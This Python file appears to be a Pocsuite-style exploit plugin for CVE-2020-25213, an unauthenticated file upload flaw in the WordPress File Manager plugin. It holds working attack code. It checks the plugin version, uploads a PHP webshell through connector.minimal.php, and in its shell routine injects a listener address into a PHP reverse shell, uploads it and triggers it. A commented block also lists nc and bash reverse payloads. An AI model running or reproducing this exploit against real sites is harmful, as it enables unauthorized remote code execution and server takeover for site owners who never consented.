"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse

from Tools.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Tools.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import binascii
from configvalue import *
from Tools.PocSuite.shellcodes.php import PhpShellCode


class DemoPOC(POCBase):
    vulID = 'CVE-2020-25213'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '13/03/2020'
    createDate = '2020-11-15'
    updateDate = '2020-11-15'
    references = ['https://wpscan.com/vulnerability/10389']
    name = 'WordPress - File Manager < 6.9 - Unauthenticated Arbitrary File Upload leading to RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PHP],
                "folder_init": "cve_2020_25213"}
    appName = 'wordpress-cve-2020-25213'
    appVersion = 'CVE-2020-25213'
    vulType = VUL_TYPE.UPLOAD_FILES
    desc = '''File lib/php/connector.minimal.php can be default opened directly, and this file load lib/php/elFinderConnector.class.php which read POST/GET variables, and then allow executing some internal feature, like uploading file. PHP is allowed, thus this lead to unauthenticated arbitrary file upload and remote code execution. '''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 9.5 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''
    url_result = {}
    # def _options(self):
    #     o = OrderedDict()
    #     payload = {
    #         "nc": REVERSE_PAYLOAD.NC,
    #         "bash": REVERSE_PAYLOAD.BASH,
    #     }
    #     o["command"] = OptDict(selected="bash", default=payload)
    #     return o

    def check_version(self, url):
        try: 
            resp = requests.get(url + '/wp-content/plugins/wp-file-manager/readme.txt')
            if resp.status_code != 200:
                return False
            fixed_version = 6.9
            items = re.findall("Stable tag.*$", resp.text, re.MULTILINE)
            for x in items: 
                if(float)(x.split(": ")[1]) < fixed_version: 
                    return True
                else: 
                    return False 
        except: 
            return False
                
       

    def _verify(self):
        result = {}
        flag = "\{\"error\":\[\"errUnknownCmd\"\]\}"
        r = requests.get(self.url +'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
        check  = self.check_version(self.url)
        try: 
            if check: 
                if re.search(flag, r.text): 
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['url'] = self.url + 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
        
        except Exception as e: 
            logger.warn(str(e))
        return self.parse_output(result)
        
       

    def _attack(self):
        #getdata input
        #datainput = self.headers['Referer']['input']
        self.headers['Referer'] = ''
        #-- 
        #self.url = datainput['entrypoint']

        result = {}
        check = self.check_version(self.url)
        
        filename = os.path.join(paths.POCSUITE_ROOT_PATH, "init_pocs/cve_2020_25213/simple_webshell.php")
        if check: 
            data = {
        	    'cmd': 'upload', 
        	    'target': 'l1_', 
        	    'debug': 1
        	}
            files = {
        	    'upload[0]': open(filename, 'rb')
        	}
            vulurl = self.url +  "wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
            requests.post(vulurl, data=data, files=files, verify=False) 
            r = requests.get( self.url + 'wp-content/plugins/wp-file-manager/lib/files/simple_webshell.php')
            if r.status_code == 200 and "shell is available" in r.text: 
                result['ShellInfo'] = {}
                result['ShellInfo']['url'] =  self.url  + "wp-content/plugins/wp-file-manager/lib/files/simple_webshell.php"
                result['ShellInfo']['info'] = '''wordpress file manager plugin RCE ''' 
            return self.parse_output(result)
        return self.parse_output(False)

    def _shell(self):
        #getdata input
        datainput = self.headers['Referer']['input']
        self.headers['Referer'] = ''
        #-- 
        self.url =  datainput['entrypoint']
        filename_source = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_25213/php-reverse-shell-source.php')
        with open(filename_source, "rb") as file:
            shell  = file.read().decode()
            file.close()
        shell = shell.replace('LHOST_cve_2020_25213', datainput['LHOST'])
        shell = shell.replace('LPORT_cve_2020_25213', str(datainput['LPORT']))
        filename = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_25213/php-reverse-shell.php')
        with open(filename, "wb") as file:
            file.write( str.encode(shell))
            file.close()
        result = {}
        data = {
                'cmd': 'upload', 
                'target': 'l1_', 
                'debug': 1
        }
        files = {
                'upload[0]': open(filename,'rb')
                
        }
        
        vulnurl = self.url  + "wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        requests.post(vulnurl, data=data, files=files, verify=False) 
        print("upload shell thanh cong ")
        requests.get(self.url  + "wp-content/plugins/wp-file-manager/lib/files/php-reverse-shell.php")
                 
   

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
